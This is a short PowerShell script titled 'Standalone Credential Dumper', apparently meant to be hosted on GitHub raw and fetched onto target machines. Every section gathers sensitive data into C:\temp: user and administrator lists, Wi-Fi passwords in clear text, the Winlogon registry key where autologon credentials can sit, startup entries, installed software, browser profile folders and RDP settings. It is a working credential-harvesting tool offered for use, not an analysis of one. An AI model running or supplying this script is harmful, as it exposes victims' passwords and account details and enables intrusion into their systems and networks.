# Standalone Credential Dumper - Upload to your GitHub raw
param([string]$OutputDir="C:\temp")

# Create output directory
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# 1. SYSTEM INFO
"WHOAMI: $(whoami /all)" | Out-File "$OutputDir\whoami.txt"
"USERS: $(net user)" | Out-File "$OutputDir\users.txt"
"ADMINS: $(net localgroup administrators)" | Out-File "$OutputDir\admins.txt"

# 2. WIFI PASSWORDS
$wifi = netsh wlan show profiles
$wifi | Out-File "$OutputDir\wifi_profiles.txt"
foreach ($line in $wifi) {
    if ($line -match "All User Profile\s*:\s*(.+)$") {
        $profile = $matches[1]
        $key = netsh wlan show profile name="$profile" key=clear
        $key | Out-File "$OutputDir\wifi_$profile.txt"
    }
}

# 3. REGISTRY SECRETS
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Out-File "$OutputDir\winlogon.txt" 2>$null
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" | Out-File "$OutputDir\startup.txt" 2>$null

# 4. SOFTWARE INVENTORY
wmic product get name,version | Out-File "$OutputDir\software.txt"

# 5. BROWSERS
Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome" -Directory | Out-File "$OutputDir\chrome.txt" 2>$null
Get-ChildItem "C:\Users\*\AppData\Local\Microsoft\Edge" -Directory | Out-File "$OutputDir\edge.txt" 2>$null

# 6. RDP/AUTOLOGON
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication | Out-File "$OutputDir\rdp.txt" 2>$null

Write-Output "All data dumped to $OutputDir"
